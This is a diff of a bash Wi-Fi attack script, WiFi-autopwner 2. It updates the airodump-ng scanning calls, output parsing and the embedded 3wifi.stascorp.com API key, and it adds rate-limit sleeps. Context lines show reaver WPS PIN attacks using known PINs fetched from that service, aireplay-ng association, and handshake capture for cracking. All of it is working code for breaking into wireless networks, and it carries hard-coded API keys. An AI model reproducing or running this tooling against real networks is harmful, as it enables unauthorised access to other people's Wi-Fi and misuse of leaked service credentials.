@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Mi-Al/WiFi-autopwner 2
-VERS="20181014" # RIPF-release
+VERS="20190113" # hate-tourists-release
 
 IFACE=""
 REPLY=""
@@ -280,11 +280,11 @@ function PixieDustAattack {
 function showOpen {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings17]}
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
 		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
 		if [[ "$NOPASS" ]]; then
 			echo -e ${Lang[Strings18]}
-			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk '{print $19}'| sed 's/,//' | cat -b
+			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk -F"," '{print "MAC: " $1 ", Power:" $9 ", Data: " $11 ",   Name:" $14}'
 		else
 			echo -e ${Lang[Strings19]}	
 		fi
@@ -307,7 +307,7 @@ function showOpen {
 function attackWEP {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings20]}
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
 		WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
 		if [[ "$WEP" ]]; then
 			echo ${Lang[Strings21]}
@@ -530,7 +530,7 @@ function getCertainHandshake {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings51]}
 
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -w /tmp/allwifinetworks --output-format csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -w /tmp/allwifinetworks --output-format csv"
 		ALL=$(cat /tmp/allwifinetworks-01.csv)
 		if [[ "$ALL" ]]; then
 			echo -e ${Lang[Strings53]}
@@ -574,7 +574,7 @@ function getCertainHandshakeAndCrackIt {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings51]}
 
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -w /tmp/allwifinetworks --output-format csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -w /tmp/allwifinetworks --output-format csv"
 		ALL=$(cat /tmp/allwifinetworks-01.csv)
 		if [[ "$ALL" ]]; then
 			echo -e ${Lang[Strings53]}
@@ -716,7 +716,8 @@ function 3WIFI {
 			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`
 
 			echo "${Lang[Strings44]} $BSSID ${Lang[Strings45]} $ESSID)"
-			echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid='$BSSID`\e[0m" | grep -E -v ':\[\]'
+			echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid='$BSSID`\e[0m" | grep -E -v ':\[\]'
+			sleep 10
 		
 		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
 
@@ -729,7 +730,8 @@ function 3WIFI {
 			if [[ "$ESSID" ]]; then
 				echo "${Lang[Strings44]} $ESSID"
 				ESSID=`echo $ESSID | sed 's/ /+/g'`
-				echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&sens=1&bssid=*&essid='$ESSID`\e[0m" | grep -E -v ':\[\]'
+				echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&sens=1&bssid=*&essid='$ESSID`\e[0m" | grep -E -v ':\[\]'
+				sleep 10
 			fi
 		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
 
@@ -804,7 +806,7 @@ function connectWifiWithPassword {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings58]}
 		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
-		sudo iw dev "$IFACE" scan | grep SSID | sed 's/SSID: //' | tr -d " \t" > /tmp/allwifinetworks
+		sudo iw dev "$IFACE" scan | grep "SSID: " | sed 's/SSID: //' | sed -e 's/^[ \t]*//' | grep -E -v "^$" > /tmp/allwifinetworks
 		cat /tmp/allwifinetworks | cat -b
 		read -p "${Lang[Strings59]} " AIM
 		ESSID=`cat /tmp/allwifinetworks | awk 'NR=='"$AIM" | sed 's/ //'`
@@ -812,7 +814,7 @@ function connectWifiWithPassword {
 		sudo rm /tmp/allwifinetworks*
 		read -p "${Lang[Strings61]} " PASSWORD
 		wpa_passphrase "$ESSID" "$PASSWORD" > /tmp/wpa_"$ESSID".conf
-		wpa_supplicant -B -i "$IFACE" -c /tmp/wpa_"$ESSID".conf
+		wpa_supplicant -B -i "$IFACE" -c /tmp/wpa_"$ESSID".conf -d
 		echo "${Lang[Strings62]}"
 		sleep 5
 		dhclient "$IFACE"
@@ -836,7 +838,7 @@ function connectOpenWifi {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings58]}
 
-		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
+		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
 		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
 		if [[ "$NOPASS" ]]; then
 			echo -e ${Lang[Strings18]}
@@ -995,7 +997,7 @@ function knownPINsAttack {
 			sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
 			sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -p $knownPIN -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
 
-		done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')
+		done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')
 
 	else
 		INF=${Lang[Strings5]}
@@ -1067,7 +1069,7 @@ function knownPINsAttackAgainstAll {
 							else
 								echo ${Lang[Strings15]}
 							fi
-						done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')					
+						done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')					
 					fi
 				else
 					ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
